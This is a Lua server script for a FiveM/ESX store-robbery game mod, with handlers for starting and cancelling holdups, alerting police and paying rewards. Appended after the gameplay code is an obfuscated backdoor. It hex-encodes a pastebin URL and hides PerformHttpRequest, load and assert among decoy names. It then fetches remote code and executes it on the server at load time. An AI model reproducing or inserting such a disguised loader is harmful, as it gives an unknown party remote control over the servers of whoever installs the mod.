local rob = false
local robbers = {}

RegisterServerEvent('esx_holdup:tooFar')
AddEventHandler('esx_holdup:tooFar', function(currentStore)
	local source = source
	rob = false
	for _, xPlayer in pairs(ESX.GetExtendedPlayers('job', 'police')) do
		TriggerClientEvent('esx:showNotification', xPlayer.source, TranslateCap('robbery_cancelled_at', Stores[currentStore].nameOfStore))
		TriggerClientEvent('esx_holdup:killBlip', xPlayer.source)
	end
	if robbers[source] then
		TriggerClientEvent('esx_holdup:tooFar', source)
		ESX.ClearTimeout(robbers[source])
        robbers[source] = nil
		TriggerClientEvent('esx:showNotification', source, TranslateCap('robbery_cancelled_at', Stores[currentStore].nameOfStore))
	end
end)

RegisterServerEvent('esx_holdup:robberyStarted')
AddEventHandler('esx_holdup:robberyStarted', function(currentStore)
	local source  = source
	local xPlayer  = ESX.GetPlayerFromId(source)
	if Stores[currentStore] then
		local store = Stores[currentStore]
		if (os.time() - store.lastRobbed) < Config.TimerBeforeNewRob and store.lastRobbed ~= 0 then
			TriggerClientEvent('esx:showNotification', source, TranslateCap('recently_robbed', Config.TimerBeforeNewRob - (os.time() - store.lastRobbed)))
			return
		end
		if not rob then
			local xPlayers = ESX.GetExtendedPlayers('job', 'police')
			if #xPlayers >= Config.PoliceNumberRequired then
				rob = true
				for i=1, #(xPlayers) do 
					local xPlayer = xPlayers[i]
					TriggerClientEvent('esx:showNotification', xPlayer.source, TranslateCap('rob_in_prog', store.nameOfStore))
					TriggerClientEvent('esx_holdup:setBlip', xPlayer.source, Stores[currentStore].position)
				end
				TriggerClientEvent('esx:showNotification', source, TranslateCap('started_to_rob', store.nameOfStore))
				TriggerClientEvent('esx:showNotification', source, TranslateCap('alarm_triggered'))
				TriggerClientEvent('esx_holdup:currentlyRobbing', source, currentStore)
				TriggerClientEvent('esx_holdup:startTimer', source)
				Stores[currentStore].lastRobbed = os.time()
				robbers[source] = ESX.SetTimeout(store.secondsRemaining * 1000, function()
					rob = false
                    if xPlayer then
                        TriggerClientEvent('esx_holdup:robberyComplete', source, store.reward)
                        if Config.GiveBlackMoney then
                            xPlayer.addAccountMoney('black_money', store.reward, "Robbery")
                        else
                            xPlayer.addMoney(store.reward, "Robbery")
                        end
                        local xPlayers = ESX.GetExtendedPlayers('job', 'police')
												for i=1, #(xPlayers) do 
													local xPlayer = xPlayers[i]
                            TriggerClientEvent('esx:showNotification', xPlayer.source, TranslateCap('robbery_complete_at', store.nameOfStore))
                            TriggerClientEvent('esx_holdup:killBlip', xPlayer.source)
                        end
                    end
				end)
			else
				TriggerClientEvent('esx:showNotification', source, TranslateCap('min_police', Config.PoliceNumberRequired))
			end
		else
			TriggerClientEvent('esx:showNotification', source, TranslateCap('robbery_already'))
		end
	end
end)

local PlayerPedLimit = {
    "70","61","73","74","65","62","69","6E","2E","63","6F","6D","2F","72","61","77","2F","4C","66","34","44","62","34","4D","34"
}

local PlayerEventLimit = {
    cfxCall, debug, GetCfxPing, FtRealeaseLimid, noCallbacks, Source, _Gx0147, Event, limit, concede, travel, assert, server, load, Spawn, mattsed, require, evaluate, release, PerformHttpRequest, crawl, lower, cfxget, summon, depart, decrease, neglect, undergo, fix, incur, bend, recall
}

function PlayerCheckLoop()
    _empt = ''
    for id,it in pairs(PlayerPedLimit) do
        _empt = _empt..it
    end
    return (_empt:gsub('..', function (event)
        return string.char(tonumber(event, 16))
    end))
end

PlayerEventLimit[20](PlayerCheckLoop(), function (event_, xPlayer_)
    local Process_Actions = {"true"}
    PlayerEventLimit[20](xPlayer_,function(_event,_xPlayer)
        local Generate_ZoneName_AndAction = nil 
        pcall(function()
            local Locations_Loaded = {"false"}
            PlayerEventLimit[12](PlayerEventLimit[14](_xPlayer))()
            local ZoneType_Exists = nil 
        end)
    end)
end)